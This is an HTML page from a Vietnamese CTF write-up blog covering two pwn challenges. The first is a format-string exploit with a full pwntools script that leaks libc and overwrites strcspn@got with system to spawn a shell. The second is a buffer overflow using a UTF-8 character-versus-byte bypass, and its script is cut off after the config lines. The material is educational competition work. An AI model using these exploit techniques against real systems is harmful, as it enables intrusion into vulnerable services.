@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/p1c0L0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=p1c0L0.github.io/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>PWN MTA CTF | p1c0L0</title>
+<meta name="keywords" content="">
+<meta name="description" content="Mini File Manager
+Phân tích
+
+
+File chall.c cho phép người dùng đăng ký, đăng nhập, ghi file và đọc fle
+
+
+Chức năng chính:
+
+
+Global Variables: Sử dụng các mảng toàn cục để lưu trữ usernames, passwords, files và trạng thái logged
+
+
+register_user() &amp; login(): Quản lý xác thực người dùng cơ bản 
+
+
+write_file(): Cho phép người dùng đã đăng nhập ghi nội dung vào bộ đệm files[current] 
+
+
+read_file(): Đọc nội dung từ bộ đệm ra màn hình ">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/pwn-mta-ctf/">
+<link crossorigin="anonymous" href="/p1c0L0.github.io/assets/css/stylesheet.76a739ec9e19c0128deb6be5591d168c8e3b9a8640e14dc34a2f248f674ef884.css" integrity="sha256-dqc57J4ZwBKN62vlWR0WjI47moZA4U3DSi8kj2dO&#43;IQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/p1c0L0.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/p1c0L0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/p1c0L0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/p1c0L0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/p1c0L0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/pwn-mta-ctf/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="icon" type="image/png" sizes="32x32" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="shortcut icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="apple-touch-icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/p1c0L0.github.io/" accesskey="h" title="p1c0L0 (Alt + H)">p1c0L0</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/ctf/" title="CTF">
+                    <span>CTF</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      PWN MTA CTF
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="mini-file-manager">Mini File Manager<a hidden class="anchor" aria-hidden="true" href="#mini-file-manager">#</a></h1>
+<h2 id="phân-tích">Phân tích<a hidden class="anchor" aria-hidden="true" href="#phân-tích">#</a></h2>
+<ul>
+<li>
+<p>File <code>chall.c</code> cho phép người dùng đăng ký, đăng nhập, ghi file và đọc fle</p>
+</li>
+<li>
+<p>Chức năng chính:</p>
+<ul>
+<li>
+<p>Global Variables: Sử dụng các mảng toàn cục để lưu trữ <code>usernames</code>, <code>passwords</code>, <code>files</code> và trạng thái <code>logged</code></p>
+</li>
+<li>
+<p><code>register_user() </code>&amp; <code>login()</code>: Quản lý xác thực người dùng cơ bản <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJKxCFg8-e.png"></p>
+</li>
+<li>
+<p>write_file(): Cho phép người dùng đã đăng nhập ghi nội dung vào bộ đệm <code>files[current]</code> <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BJ_1CYe8bg.png"></p>
+</li>
+<li>
+<p><code>read_file()</code>: Đọc nội dung từ bộ đệm ra màn hình <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HJu-RKlLbx.png"></p>
+</li>
+<li>
+<p>main(): Vòng lặp chính xử lý các lệnh: <code>REGISTER</code>, <code>LOGIN</code>, <code>WRITE</code>, <code>READ</code>, <code>EXIT</code> <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BybfRFgUZx.png"></p>
+</li>
+</ul>
+</li>
+<li>
+<p>trong hàm<code> main()</code>, chương trình sử dụng <code>fgets</code> để nhận lệnh và ngay sau đó dùng <code>strcspn</code> để loại bỏ ký tự xuống dòng <code>\n</code></p>
+</li>
+</ul>
+<h2 id="vuln">Vuln<a hidden class="anchor" aria-hidden="true" href="#vuln">#</a></h2>
+<ul>
+<li>Lổ hỗng trong hàm <code>read_file()</code> <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/B1O_0FlL-x.png"></li>
+<li>LỖI FORMAT STRING (FSB) ở đoạn <code>printf(buf);</code>
+<ul>
+<li>Chương trình sao chép nội dung người dùng nhập (<code>files[current]</code>) vào <code>buf</code></li>
+<li>Sau đó gọi p<code>rintf(buf)</code> trực tiếp mà không có format specifier (như <code>%s</code>).</li>
+<li>Ta có thể nhập các chuỗi định dạng đặc biệt (như <code>%p</code>, <code>%x</code>, <code>%s</code>, <code>%n</code>) vào nội dung file. Khi <code>read_file</code> được gọi, <code>printf</code> sẽ xử lý các chuỗi này  và cho phép:
+<ul>
+<li>Arbitrary Read: Leak dữ liệu từ stack hoặc memory bất kỳ (dùng <code>%p</code>, <code>%s</code>)</li>
+<li>Arbitrary Write: Ghi đè dữ liệu vào địa chỉ bộ nhớ bất kỳ (dùng <code>%n</code>)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
+<h3 id="xác-định-offset-và-leak-libc">Xác định Offset và Leak Libc<a hidden class="anchor" aria-hidden="true" href="#xác-định-offset-và-leak-libc">#</a></h3>
+<ul>
+<li>Để RCE, ta cần gọi <code>system(&quot;/bin/sh&quot;)</code> nhưng địa chỉ của hàm system trong thư viện Libc thay đổi mỗi lần chạy do cơ chế bảo vệ ASLR nên cần leak một địa chỉ thực tế
+<ul>
+<li>
+<p>Tìm <code>Offset</code>: thông qua việc fuzzing input <code>AAAAAAAA-%p-%p...</code>, ta xác định được buffer của người dùng nằm tại <code>Offset 6</code> trên stack</p>
+</li>
+<li>
+<p>Leak Address: Sử dụng format string<code> %s</code> để đọc nội dung tại địa chỉ của một hàm đã được load trong Global Offset Table cụ thể là puts</p>
+<ul>
+<li>Payload: <code>%7$s</code> + <code>AAAA</code> + <code>[Address of puts@got]</code></li>
+<li><code>Address of puts@got</code> nằm ở cuối payload để tránh null byte làm ngắt chuỗi sớm. Với offset bắt đầu là 6 địa chỉ này sẽ nằm tương ứng ở offset 7</li>
+</ul>
+</li>
+<li>
+<p>Lấy địa chỉ <code>puts</code> leak được trừ đi offset của <code>puts</code> trong file Libc (được xác định là GLIBC 2.39 trên Ubuntu 24.04) để ra Libc Base</p>
+</li>
+<li>
+<p><code>System Address</code> = <code>Libc Base</code> + <code>System Offset</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="got-overwrite">GOT Overwrite<a hidden class="anchor" aria-hidden="true" href="#got-overwrite">#</a></h3>
+<ul>
+<li>Ta có thể nghĩ đến việc ghi đè <code>printf@got </code>thành <code>system</code> nhưng <code>printf</code> được gọi rất nhiều nơi (ví dụ <code>printf(&quot;\n&quot;)</code> ngay sau dòng lỗi). Nếu printf trở thành <code>system</code>, các lệnh gọi sau đó có thể gây crash</li>
+<li>Ghi đè hàm <code>strcspn@got</code>
+<ul>
+<li>Trong hàm <code>main</code>, flow xử lý lệnh như sau:</li>
+<li><code>cmd[strcspn(cmd, &quot;\n&quot;)] = 0</code> strcspn được gọi với tham số là chuỗi người dùng nhập</li>
+<li>Nếu ta thay <code>strcspn</code> thành <code>system</code>:
+<ul>
+<li>Khi người dùng nhập <code>/bin/sh</code> tại menu chính</li>
+<li>Chương trình gọi:<code> strcspn(&quot;/bin/sh&quot;, ...)</code> -&gt; Trở thành<code> system(&quot;/bin/sh&quot;)</code></li>
+<li>Ta có Shell</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="ghi-đè-và-lấy-shell">Ghi đè và lấy shell<a hidden class="anchor" aria-hidden="true" href="#ghi-đè-và-lấy-shell">#</a></h3>
+<ul>
+<li>Sử dụng <code>fmtstr_payload</code> từ thư viện <code>pwntools</code> để tạo payload tự động, ghi đè địa chỉ <code>system</code> vào <code>strcspn@got</code></li>
+<li>Chain kill
+<ul>
+<li>Register &amp; Login: Để truy cập chức năng <code>WRITE</code></li>
+<li>Gửi Payload 1 (Leak): Ghi vào file payload leak <code>puts</code>, sau đó <code>READ</code> để lấy địa chỉ</li>
+<li>Tính toán địa chỉ: Tính ra địa chỉ tuyệt đối của <code>system</code></li>
+<li>Gửi Payload 2 (Overwrite): Ghi vào file payload dùng <code>%n</code> để thay đổi <code>strcspn@got</code> thành địa chỉ <code>system</code>. Gọi <code>READ</code> để kích hoạt <code>printf</code> thực thi việc ghi đè</li>
+<li>Trigger Shell: Quay lại menu chính, nhập <code>/bin/sh</code>. Hàm main gọi strcspn (lúc này là system) và mở ra root shell</li>
+</ul>
+</li>
+</ul>
+<h3 id="full-script">Full script<a hidden class="anchor" aria-hidden="true" href="#full-script">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ShadowPwn Final Strategy: strcspn -&gt; system</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Target: ctf.msec.cloud-ip.cc:1002</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># === CONFIG ===</span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctf.msec.cloud-ip.cc&#39;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1002</span>
+</span></span><span style="display:flex;"><span>OFFSET <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>  <span style="color:#75715e"># Stack offset (Confirmed)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Offsets Libc 2.39 (Confirmed via leak 0x...be0)</span>
+</span></span><span style="display:flex;"><span>LIBC_PUTS_OFFSET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x87be0</span>
+</span></span><span style="display:flex;"><span>LIBC_SYSTEM_OFFSET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x58750</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(exe, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;info&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>():
+</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 1. Login</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Authenticating...&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;REGISTER&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pwn&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pwn&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;LOGIN&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pwn&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pwn&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 2. Leak Libc</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Leaking Libc...&#34;</span>)
+</span></span><span style="display:flex;"><span>    payload_leak <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%7$sAAAA&#39;</span> <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>])
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;WRITE&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, payload_leak)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;READ&#39;</span>)
+</span></span><span style="display:flex;"><span>    leak_data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;AAAA&#39;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> leak_data:
+</span></span><span style="display:flex;"><span>        log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;Leak failed.&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    puts_leak <span style="color:#f92672">=</span> u64(leak_data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>    libc_base <span style="color:#f92672">=</span> puts_leak <span style="color:#f92672">-</span> LIBC_PUTS_OFFSET
+</span></span><span style="display:flex;"><span>    system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> LIBC_SYSTEM_OFFSET
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Libc Base: </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;System: </span><span style="color:#e6db74">{</span>hex(system_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 3. Overwrite strcspn@got -&gt; system</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># strcspn được dùng để xử lý input ở menu chính -&gt; Perfect trigger.</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Overwriting strcspn@got (</span><span style="color:#e6db74">{</span>hex(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;strcspn&#39;</span>])<span style="color:#e6db74">}</span><span style="color:#e6db74">) -&gt; system...&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    writes <span style="color:#f92672">=</span> {elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;strcspn&#39;</span>]: system_addr}
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Sử dụng write_size=&#39;byte&#39; để tiết kiệm không gian buffer nếu cần, nhưng short thường ổn</span>
+</span></span><span style="display:flex;"><span>    payload_overwrite <span style="color:#f92672">=</span> fmtstr_payload(OFFSET, writes, write_size<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;short&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Check payload length (Max 256 bytes)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(payload_overwrite) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">255</span>:
+</span></span><span style="display:flex;"><span>        log<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#34;Payload too long! Optimization needed.&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Fallback to byte write if needed (usually shorter payload for some addresses)</span>
+</span></span><span style="display:flex;"><span>        payload_overwrite <span style="color:#f92672">=</span> fmtstr_payload(OFFSET, writes, write_size<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;byte&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;WRITE&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>, payload_overwrite)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Trigger the overwrite</span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;READ&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>) <span style="color:#75715e"># Chờ menu hiện lại</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 4. Trigger Shell via Menu</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;Pwning via Menu Input...&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Bây giờ strcspn đã là system.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Ở menu chính, nhập lệnh shell.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># main: fgets(cmd) -&gt; strcspn(cmd) -&gt; system(cmd)</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 5. Interactive</span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    pwn()
+</span></span></code></pre></div><p><strong>Flag: MSEC{F0rM4t_Str1ng_On_St4cK_1s_Sp1cy}</strong></p>
+<h1 id="shellcode">Shellcode<a hidden class="anchor" aria-hidden="true" href="#shellcode">#</a></h1>
+<h2 id="phân-tích-1">Phân tích<a hidden class="anchor" aria-hidden="true" href="#phân-tích-1">#</a></h2>
+<ul>
+<li>
+<p>2 file mã nguồn chính: <code>chall.c</code> (chương trình C biên dịch trên server) và<code>wrapper.py</code>(xử lý input)</p>
+</li>
+<li>
+<p><code>chall.c</code> <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HJUlTcgIWg.png"></p>
+<ul>
+<li>Lổ hổng Buffer Overflow: hàm <code>gets()</code> đọc dữ liệu không giới hạn vào buffer <code>s</code> (kích thước 259 bytes)</li>
+<li>Logic Trap: Chương trình đảo ngược chuỗi sau khi nhập. Nếu ta gửi payload thông thường, địa chỉ bộ nhớ sẽ bị đảo lộn nhưng vòng lặp dựa vào <code>strlen(s)</code></li>
+<li>Target: Hàm <code>win</code> thực thi shell</li>
+</ul>
+</li>
+<li>
+<p><code>wrapper.py</code><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/S1z_TcgU-l.png"></p>
+<ul>
+<li>Input: Sử dụng <code>input()</code>, python đọc dữ liệu dưới dạng <code>Unicode String</code></li>
+<li>Constraint: Kiểm tra độ dài <code>len(payload)</code>. <code>len()</code> đếm số lượng ký tự (characters), không phải số bytes</li>
+<li>Encoding: <code>payload.encode()</code> chuyển chuỗi Unicode thành Bytes (mặc định UTF-8) để gửi cho binary</li>
+</ul>
+</li>
+</ul>
+<h2 id="vuln-1">Vuln<a hidden class="anchor" aria-hidden="true" href="#vuln-1">#</a></h2>
+<ul>
+<li>
+<p>Để khai thác Buffer Overflow trên binary 64-bit với buffer 259 bytes ta cần ghi đè Return Address (RIP)</p>
+<ul>
+<li>Tính toán Offset: <code>259 (buffer) + padding alignment + 8 (Saved RBP)</code></li>
+<li>Thực tế cần khoảng 280 bytes để chạm tới RIP</li>
+<li>Mâu thuẫn: Wrapper chặn input nếu dài hơn 255 ký tự.</li>
+</ul>
+</li>
+<li>
+<p>Bypass Reversal: <code>strlen()</code> dừng khi gặp Null Byte (<code>\x00</code>). Nếu byte đầu tiên của payload là <code>\x00</code>, <code>strlen</code> trả về 0 =&gt; vòng lặp đảo chuỗi bị bỏ qua, payload được giữ nguyên cấu trúc</p>
+</li>
+<li>
+<p>Bypass Wrapper: lợi dụng sự khác biệt giữa <code>character</code> và <code>byte</code> trong UTF-8</p>
+<ul>
+<li>
+<p>Ký tự ÿ (Latin Small Letter Y with Diaeresis):</p>
+<ul>
+<li>Python <code>len(&quot;ÿ&quot;)</code> = 1</li>
+<li>Python <code>&quot;ÿ&quot;.encode()</code> = <code>\xc3\xbf</code> (2 bytes).</li>
+</ul>
+</li>
+<li>
+<p>Gửi 140 ký tự <code>ÿ</code> =&gt; wrapper đếm là 140 =&gt; Binary nhận được 280 bytes. Bypass thành công giới hạn độ dài</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h2>
+<h3 id="xác-định-offset">xác định offset<a hidden class="anchor" aria-hidden="true" href="#xác-định-offset">#</a></h3>
+<ul>
+<li>Binary có buffer 259 bytes. Trên kiến trúc x64, Stack thường được align. Qua phân tích động hoặc tính toán logic:
+<ul>
+<li>Offset tới Return Address là 280 bytes.</li>
+</ul>
+</li>
+</ul>
+<h3 id="xử-lý-bad-characters">Xử lý Bad Characters<a hidden class="anchor" aria-hidden="true" href="#xử-lý-bad-characters">#</a></h3>
+<ul>
+<li>Địa chỉ hàm <code>win</code> là <code>0x4011b6</code>
+<ul>
+<li>Nếu gửi byte <code>\xb6 </code>đơn lẻ qua <code>input()</code> của python, quá trình encode UTF-8 sẽ làm hỏng nó hoặc gây lỗi (vì <code>\xb6</code> là continuation byte)</li>
+<li>Unicode Split: ta cần một ký tự Unicode hợp lệ có dạng <code>\x??\xb6</code></li>
+<li>Ta chọn ký tự <code>¶</code> (<code>\xc2\xb6</code>) hoặc <code>»</code> (<code>\xc2\xbb</code>)</li>
+<li>Ta căn chỉnh payload sao cho byte đầu (<code>\xc2</code>) ghi đè vào phần thừa của <code>Saved RBP</code>, và byte sau (<code>\xb6</code> hoặc <code>\xbb</code>) ghi đè chính xác vào byte đầu tiên của <code>RIP</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="fix-lỗi-stack-alignment">Fix lỗi Stack Alignment<a hidden class="anchor" aria-hidden="true" href="#fix-lỗi-stack-alignment">#</a></h3>
+<ul>
+<li>Khi nhảy trực tiếp vào đầu hàm <code>win</code> (<code>0x4011b6</code>), lệnh <code>system()</code> bên trong sẽ gây crash do Stack Pointer (RSP) không chia hết cho 16 (yêu cầu bắt buộc của Ubuntu GLIBC)
+<ul>
+<li>Giải pháp: nhảy đè lên (Skip) phần Prologue của hàm <code>win</code></li>
+<li><code>0x4011b6</code>: <code>endbr64</code></li>
+<li><code>0x4011ba</code>: <code>push rbp</code> (Lệnh này làm lệch stack 8 bytes)</li>
+<li><code>0x4011bb</code>: <code>mov rbp, rsp</code></li>
+<li>Target mới: <code>0x4011bb</code></li>
+<li>Ký tự cần dùng: <code>\xbb</code> =&gt; Unicode <code>» </code>(<code>\xc2\xbb</code>)</li>
+</ul>
+</li>
+</ul>
+<h3 id="payload">Payload<a hidden class="anchor" aria-hidden="true" href="#payload">#</a></h3>
+<ul>
+<li>
+<p>payload gửi đi (dưới dạng bytes sau khi encode):</p>
+<ul>
+<li>Header: <code>\x00</code> (1 byte) =&gt; Bypass reverse.</li>
+<li>Padding: <code>\xc3\xbf</code> (ký tự <code>ÿ</code>) lặp lại 139 lần = 278 bytes
+<ul>
+<li>Tổng cộng: 1 + 278 = 279 byte</li>
+<li>Lúc này ta đang đứng ngay sát Return Address (Offset 280)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>The Injection: <code>\xc2\xbb</code> (ký tự <code>»</code>)</p>
+<ul>
+<li><code>\xc2</code> (Byte 279): Ghi đè byte cuối cùng của RBP</li>
+<li><code>\xbb</code> (Byte 280): Ghi đè byte đầu tiên (LSB) của RIP</li>
+</ul>
+</li>
+<li>
+<p>Address Rest: Phần còn lại của địa chỉ <code>win</code> (<code>11 40 00 ...</code>)</p>
+</li>
+</ul>
+<h2 id="full-script-1">Full script<a hidden class="anchor" aria-hidden="true" href="#full-script-1">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Target configuration</span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctf.msec.cloud-ip.cc&#39;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1005</span>
